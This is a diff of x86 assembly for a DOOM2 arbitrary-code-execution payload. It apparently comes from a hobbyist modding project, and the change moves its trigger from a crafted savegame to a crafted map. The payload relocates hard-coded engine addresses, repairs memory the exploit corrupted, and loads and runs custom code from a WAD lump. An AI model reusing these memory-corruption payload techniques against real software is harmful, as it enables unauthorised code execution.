@@ -1,9 +1,9 @@
 // kgsws' DOOM2 code execution
-// - this code is running from memory block allocated but already freed by ZONE
-// - this source only contains payload, you still need exploited savegame file
+// - this code is running from memory block allocated by cached REJECT lump
+// - this source only contains payload, you still need exploited map
 //
-// %eax - address of savebuffer variable
-// %edx - pointer to pspdef_t in player structure
+// %eax - address somewhere in code
+// %ebx - address somewhere in data
 
 #define TEXT_START	0x1000
 
@@ -18,7 +18,7 @@
 
 _start:
 	// backup everything needed
-	push	%ebx
+	// %ebx was backed up by the exploit
 	push	%ecx
 	push	%edx
 	push	%esi
@@ -26,14 +26,13 @@ _start:
 	push	%ebp
 
 	// get _start base
-	mov	(%eax),%esi
-	add	$(3322-TEXT_START),%esi	// ESI will always point to local base
+	mov	(%ebx),%esi
+	add	$(-TEXT_START),%esi	// ESI will always point to local base
 	// get DATA base
-	sub	$0x2B3C4,%eax
-	push	%eax
+	sub	$0x2c114,%ebx
+	push	%ebx
 	// get CODE base
-	mov	28(%esp),%eax
-	sub	$0x2D095,%eax
+	sub	$0x2e922,%eax
 
 	// relocate CODE references
 	mov	$reloc_code_start,%ebx
@@ -46,49 +45,40 @@ _start:
 	mov	$((reloc_data_end-reloc_data_start)/4),%edx
 	call	do_reloc
 
+	// fix what map exploit broke
+	mov	fixaddr0(%esi),%ebx
+	mov	$0x0364,%eax
+	mov	%eax,(%ebx)
+	xor	%ax,%ax
+	mov	%eax,4(%ebx)
+	mov	fixaddr1(%esi),%ebx
+	mov	$0x033e,%ax
+	mov	%eax,(%ebx)
+	mov	$0x03e8,%ax
+	mov	%eax,4(%ebx)
+
 	// force title screen
 	mov	gamestate(%esi),%eax
 	movw	$3,(%eax)
 	mov	wipegamestate(%esi),%eax
 	movw	$-1,(%eax)
 	call	*D_StartTitle(%esi)
+	mov	titlepic_str(%esi),%eax
+	mov	pagename(%esi),%ebx
+	mov	%eax,(%ebx)
 
-	// stop music (to free the data)
-	call	*S_StopMusic(%esi)
+	// stop sound (to free the data)
+	call	*S_Start(%esi)
 
 	// free everything not needed
 	mov	$50,%eax	// from PU_LEVEL
-	mov	$9999,%edx	// and everything else
+	mov	$999999,%edx	// and everything else
 	call	*Z_FreeTags(%esi)
 
-	// get ACE_CODE lump
+	// get ACE_CODE lump (stored in map name)
 	lea	ace_code(%esi),%eax
 	call	*W_CheckNumForName(%esi)
-	test	%eax,%eax
-	jns	load_code
 
-	// code not found
-
-	// patch 'run' key
-	mov	autorun_offs(%esi),%eax
-	movb	$1,(%eax)
-
-	// show the message
-	lea	load_message(%esi),%eax
-	xor	%edx,%edx
-	xor	%ebx,%ebx
-	call	*M_StartMessage(%esi)
-
-	// and continue the game
-	pop	%ebp
-	pop	%edi
-	pop	%esi
-	pop	%edx
-	pop	%ecx
-	pop	%ebx
-	ret
-
-load_code:
 	// get lumpinfo base
 	push	%eax	// backup lumpnum
 	lea	0x0(,%eax,4),%edx
@@ -97,6 +87,20 @@ load_code:
 	mov	lumpinfo(%esi),%edx
 	add	(%edx),%edi
 
+	// patch ACE_CODE lump name so it can't ever be read again
+	movb	$0xCC,(%edi)
+
+	// check lump size
+	mov	16(%edi),%eax	// ->size
+	test	%eax,%eax
+	jnz	do_load
+
+	// it's empty!
+	lea	error_text(%esi),%eax
+	push	%eax
+	call	*I_Error(%esi)
+
+do_load:
 	// read .bss size
 	mov	8(%edi),%eax	// ->handle
 	mov	12(%edi),%edx	// ->position
@@ -148,9 +152,9 @@ do_reloc_end:
 //
 // strings
 ace_code:
-	.string	"ACE_CODE"
-load_message:
-	.string	"This savegame is intended to be\nused with a custom PWAD.\n\nAnyway, autorun was enabled."
+	.string "MAP32"
+error_text:
+	.string "-= kgsws' Doom2 ACE loader =-\nYou did not include any code."
 
 //
 // tables
@@ -161,18 +165,18 @@ reloc_code_start:
 //
 _code_base:
 	.4byte	0
-S_StopMusic:
-	.4byte	0x0003EC40
+I_Error:
+	.4byte	0x0001AB10
 D_StartTitle:
 	.4byte	0x0001D810
 Z_Malloc:
 	.4byte	0x00039690
+S_Start:
+	.4byte	0x0003F600
 Z_FreeTags:
 	.4byte	0x00039780
 W_CheckNumForName:
 	.4byte	0x00038AF0
-M_StartMessage:
-	.4byte	0x00022EA0
 W_ReadLump:
 	.4byte	0x00038BF0
 lseek:
@@ -181,6 +185,8 @@ read:
 	.4byte	0x00040935
 autorun_offs:
 	.4byte	0x0001fbc5
+remove_mobj:
+	.4byte	0x00030ea8
 //
 reloc_code_end:
 
@@ -194,8 +200,16 @@ gamestate:
 	.4byte	0x0002B3F4
 wipegamestate:
 	.4byte	0x00011B40
+pagename:
+	.4byte	0x0002a388
 lumpinfo:
 	.4byte	0x00074FA4
+titlepic_str:
+	.4byte	0x00021430
+fixaddr0:
+	.4byte	0x0001B944
+fixaddr1:
+	.4byte	0x0001D530
 //
 reloc_data_end:
 
